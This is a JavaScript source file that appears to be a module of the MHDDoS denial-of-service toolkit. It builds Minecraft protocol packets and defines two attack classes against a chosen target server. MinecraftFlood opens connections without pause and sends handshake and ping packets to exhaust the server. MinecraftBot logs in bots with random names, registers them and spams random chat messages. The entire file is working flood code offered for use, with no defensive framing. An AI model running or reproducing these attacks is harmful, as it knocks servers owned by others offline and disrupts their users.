import net from 'net';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';

/**
 * Minecraft Protocol Utilities
 */
class MinecraftProtocol {
    static varint(value) {
        const buffer = [];
        do {
            let byte = value & 0x7F;
            value >>>= 7;
            if (value !== 0) {
                byte |= 0x80;
            }
            buffer.push(byte);
        } while (value !== 0);
        return Buffer.from(buffer);
    }

    static data(...payloads) {
        const payload = Buffer.concat(payloads);
        return Buffer.concat([this.varint(payload.length), payload]);
    }

    static short(integer) {
        const buffer = Buffer.allocUnsafe(2);
        buffer.writeUInt16BE(integer, 0);
        return buffer;
    }

    static long(integer) {
        const buffer = Buffer.allocUnsafe(8);
        buffer.writeBigInt64BE(BigInt(integer), 0);
        return buffer;
    }

    static handshake(target, port, version, state) {
        return this.data(
            this.varint(0x00),
            this.varint(version),
            this.data(Buffer.from(target)),
            this.short(port),
            this.varint(state)
        );
    }

    static login(protocol, username) {
        const usernameBuffer = Buffer.from(username);
        return this.data(
            this.varint(protocol >= 391 ? 0x00 : protocol >= 385 ? 0x01 : 0x00),
            this.data(usernameBuffer)
        );
    }

    static keepalive(protocol, numId) {
        const packetId = protocol >= 755 ? 0x0F :
                        protocol >= 712 ? 0x10 :
                        protocol >= 471 ? 0x0F : 0x10;
        
        return this.data(
            this.varint(packetId),
            protocol >= 339 ? this.long(numId) : this.varint(numId)
        );
    }

    static chat(protocol, message) {
        const packetId = protocol >= 755 ? 0x03 :
                        protocol >= 464 ? 0x03 :
                        protocol >= 389 ? 0x02 : 0x01;
        
        return this.data(
            this.varint(packetId),
            this.data(Buffer.from(message))
        );
    }
}

/**
 * Minecraft Server Attack
 */
export class MinecraftFlood {
    constructor(target, port, duration, protocol = 47, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.protocol = protocol;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(900);

            const handshake = MinecraftProtocol.handshake(
                this.target,
                this.port,
                this.protocol,
                1
            );
            const ping = MinecraftProtocol.data(Buffer.from([0x00]));

            socket.connect(this.port, this.target, () => {
                const sendData = () => {
                    if (!this.active) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    const sent1 = Tools.send(socket, handshake);
                    const sent2 = Tools.send(socket, ping);
                    
                    if (sent1 && sent2) {
                        setImmediate(sendData);
                    } else {
                        Tools.safeClose(socket);
                        resolve();
                    }
                };

                sendData();
            });

            socket.on('error', () => {
                Tools.safeClose(socket);
                resolve();
            });

            socket.on('timeout', () => {
                Tools.safeClose(socket);
                resolve();
            });
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Minecraft Bot Attack (MCBOT)
 */
export class MinecraftBot {
    constructor(target, port, duration, protocol = 47, botPrefix = 'MHDDoS_') {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.protocol = protocol;
        this.botPrefix = botPrefix;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(2000);

            const username = this.botPrefix + Tools.randomString(5);
            const password = Buffer.from(username).toString('base64').substring(0, 8);

            const handshake = MinecraftProtocol.handshake(
                this.target,
                this.port,
                this.protocol,
                2
            );
            const login = MinecraftProtocol.login(this.protocol, username);

            socket.connect(this.port, this.target, async () => {
                Tools.send(socket, handshake);
                Tools.send(socket, login);

                await Tools.sleep(1500);

                Tools.send(socket, MinecraftProtocol.chat(
                    this.protocol,
                    `/register ${password} ${password}`
                ));
                Tools.send(socket, MinecraftProtocol.chat(
                    this.protocol,
                    `/login ${password}`
                ));

                const spamChat = () => {
                    if (!this.active) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    const message = Tools.randomString(256);
                    const sent = Tools.send(socket, MinecraftProtocol.chat(this.protocol, message));

                    if (sent) {
                        setTimeout(spamChat, 1100);
                    } else {
                        Tools.safeClose(socket);
                        resolve();
                    }
                };

                spamChat();
            });

            socket.on('error', () => {
                Tools.safeClose(socket);
                resolve();
            });

            socket.on('timeout', () => {
                Tools.safeClose(socket);
                resolve();
            });
        });
    }

    stop() {
        this.active = false;
    }
}
